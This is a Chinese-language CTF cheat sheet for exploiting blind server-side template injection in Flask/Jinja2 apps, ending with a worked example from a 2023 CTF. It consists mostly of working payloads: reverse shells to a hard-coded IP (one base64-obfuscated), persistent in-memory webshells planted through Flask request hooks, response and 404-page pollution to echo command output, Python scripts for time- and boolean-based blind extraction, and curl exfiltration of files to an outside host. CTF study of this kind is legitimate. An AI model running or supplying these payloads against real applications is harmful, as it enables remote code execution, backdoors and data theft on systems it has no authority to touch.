常见的过滤可以参考[这篇文章](https://zhuanlan.zhihu.com/p/1929583564153913785)
## 写文件到static
```
code={{url_for.__globals__['__builtins__']['eval']("__import__('os').popen('echo `env` > /app/static/1.txt').read()")}}
```
这样就会把执行结果写到`/app/static/1.txt`里，再访问`static/1.txt`就可以看到结果。
## 反弹shell
题目出网的话，这是最简单的打法。
```
{{url_for.__globals__['__builtins__']['eval']("__import__('os').popen('netcat 121.89.81.39 2333 -e /bin/bash').read()")}}
```
在服务器`nc -lvp 2333`监听端口。
还有常用的
```
{{url_for.__globals__['__builtins__']['eval']("__import__('os').popen('bash${IFS}-c${IFS}\'{echo,YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMjEuODkuODEuMzkvMjMzMyAwPiYx}|{base64,-d}|{bash,-i}\'').read()")}}
```
这个`YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMjEuODkuODEuMzkvMjMzMyAwPiYx`是
`bash -i >& /dev/tcp/121.89.81.39/2333 0>&1`base64编码再url编码得到的
反弹shell有好几种方法，[参考文章](https://forum.butian.net/share/2900)
## 注入内存马🐎
[参考文章](https://xz.aliyun.com/news/13976)
### 旧版内存马
```
url_for.__globals__['__builtins__']['eval']("app.add_url_rule('/shell', 'shell', lambda :__import__('os').popen(_request_ctx_stack.top.request.args.get('cmd', 'whoami')).read())",{'_request_ctx_stack':url_for.__globals__['_request_ctx_stack'],'app':url_for.__globals__['current_app']})
```
易读
```
url_for.__globals__['__builtins__']['eval'](
    "app.add_url_rule(
        '/shell', 
        'shell', 
        lambda :__import__('os').popen(_request_ctx_stack.top.request.args.get('cmd', 'whoami')).read()
        )
    ",
    {
        '_request_ctx_stack':url_for.__globals__['_request_ctx_stack'],
        'app':url_for.__globals__['current_app']
    })
```
### 新版内存马
```
{{url_for.__globals__['__builtins__']['eval']("__import__('sys').modules['__main__'].__dict__['app'].before_request_funcs.setdefault(None,[]).append(lambda :__import__('os').popen('ls')).read()")}}
```
这样就可以执行指令。
它能**绕过“无回显”SSTI**的原因在于：**它不依赖当前模板渲染的输出，而是修改了 Web 应用的运行逻辑**，把恶意代码挂到每一次请求的生命周期中。
- `{{url_for.__globals__['__builtins__']['eval'](" ... ") }}`逃出模板沙箱，进入 Python 运行时
- `sys.modules['__main__']：`当前 Flask 主程序模块
- `.__dict__['app']` 获取 Flask 应用对象 `app`
- `app.before_request_funcs.setdefault(None,[]).append(lambda : ...)` `before_request_funcs` 存储“每个请求到来之前要执行的函数” `None`：表示**对所有蓝图生效** `append(lambda: ...)`添加匿名函数。从此以后，每一个 HTTP 请求，都会先执行 lambda
- `__import__('os').popen('ls')).read()`要执行的命令。
这是用`before_request_funcs`但是这有一个问题就是执行了之后访问所有页面都会是匿名函数返回的结果。
使用`after_request()`就能避免这个问题.
```
{{url_for.__globals__['__builtins__']['eval']("app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get('cmd') and exec(\"global CmdResp;CmdResp=__import__(\'flask\').make_response(__import__(\'os\').popen(request.args.get(\'cmd\')).read())\")==None else resp)",{'request':url_for.__globals__['request'],'app':url_for.__globals__['sys'].modules['__main__'].__dict__['app']})}}
```
之后再提交get参数`?cmd=ls`就可以执行命令了。
- `after_request_funcs`：Flask 用来存放“响应返回后要执行的函数”的结构
函数逻辑
```
lambda resp:
    如果请求参数里存在某个条件（例如带了 cmd）：
        执行系统命令
        把输出封装成一个新的 Flask Response
        返回这个新的 Response（覆盖原 resp）
    否则：
        返回原本的 resp（不影响正常页面）

```
## httpheader回显
### http
```
{{lipsum.__globals__.__builtins__.setattr(lipsum.__spec__.__init__.__globals__.sys.modules.werkzeug.serving.WSGIRequestHandler,"protocol_version",lipsum.__globals__.__builtins__.__import__('os').popen('env').read())}}
```
这个可以直接把结果回显出来。
- `setattr(WSGIRequestHandler, "protocol_version", <值>)`这个可以修改`protocol_version`的值，把`HTTP/1.1`修改为`lipsum.__globals__.__builtins__.__import__('os').popen('env').read()`的执行结果。
- `lipsum.__spec__.__init__.__globals__.sys.modules.werkzeug.serving.WSGIRequestHandler`中`werkzeug.serving.WSGIRequestHandler`可以让HTTP头回显。
### server
```
{{lipsum.__globals__.__builtins__.setattr(lipsum.__spec__.__init__.__globals__.sys.modules.werkzeug.serving.WSGIRequestHandler,"server_version",lipsum.__globals__.__builtins__.__import__('os').popen('echo%20success').read())}}
```
这个没试验成功。
### 错误页面（污染404）
```
{{url_for.__globals__.__builtins__['setattr'](lipsum.__spec__.__init__.__globals__.sys.modules.werkzeug.exceptions.NotFound,'description',url_for.__globals__.__builtins__['__import__']('os').popen('ls').read())}}
```
这个可以污染404界面，注入后，只要随便访问一个不存在的界面，404界面会被执行结果所覆盖。可以使用`InternalServerError`等去替换`NotFound`来污染其他页面。
## 盲注
### 时间盲注
拿到命令执行函数后可以`{{url_for.__globals__.__builtins__.eval("__import__('os').popen('sleep 3').read()") if 1==1 else ''}}`看一下是否可以用时间盲注。如果可以,那就可以用一个脚本
```python
import requests  
import time  
  
url = input("请输入url:")  
  
result = ""  
chars = r"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_+-*/@!#$%^&()[]=;:,.?<>~`'\" \n\r"  
  
  
def check(payload):  
    start_time = time.time()  
    requests.post(url, data={"code": payload}, timeout=3)  
    # r=requests.post(url,data={"id":payload},timeout=1)  
    response_time = time.time() - start_time  
    for _ in range(3):  # 通过增加多次校验（循环 3 次判断延迟）来提升匹配准确性  
        if response_time >= 1.9:  
            return 1  
        else:  
            return 0  
  
  
for i in range(500):  
    for c in chars:  
        payload = f"{{{{config.__class__.__init__.__globals__['os'].popen('sleep 2').read() if config.__class__.__init__.__globals__['os'].popen('ls').read()[{i}]=='{c}' else ''}}}}"  
        if check(payload):  
            result += c  
            break  
    print(result)  
print(f"最终结果是{result}")
```
之所以用`{{config.__class__.__init__.__globals__['os'].popen('sleep 2').read() if config.__class__.__init__.__globals__['os'].popen('ls').read()[{i}]=='{c}' else ''}}`这个payload是因为不会出现太多引号，不用考虑转义。

### 布尔盲注
```python
import requests  
  
url = input("请输入url:")  
TRUE_TEXT = 'correct'  
  
  
def check(payload):  
    r = requests.post(url, data={"code": payload})  
    # r =requests.post(url,data={"name":payload})  
    return TRUE_TEXT in r.text  
  
  
result = ""  
chars = r"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ{}_+-*/@!#$%^&()[]=;:,.?<>~`'\" \n\r"  
  
for i in range(500):  
    for c in chars:  
        payload = f"""{{{{ 1/ (1 if config.__class__.__init__.__globals__['os'].popen('ls /').read()[{i}]=='{c}' else 0) }}}}"""  
        if check(payload):  
            result += c;  
            break  
    print(result)  
print(f"最终结果:{result}")
```
## curl外带
用curl把执行结果外带出来
```
{{config.__class__.__init__.__globals__['os'].popen('curl+fp45573k.requestrepo.com/?=`cat+/app/f*`').read()}}
```
## 例题
### 极客大挑战2023-web-klf_ssti
不论输入什么都回显一样，把上面的方法挨个试了，404请求污染是可以的，时间盲注也可以。
看wp是可以用curl外带flag，
```
{{config.__class__.__init__.__globals__['os'].popen('curl+fp45573k.requestrepo.com/?=`cat+/app/f*`').read()}}
```
这样就可以得到flag。
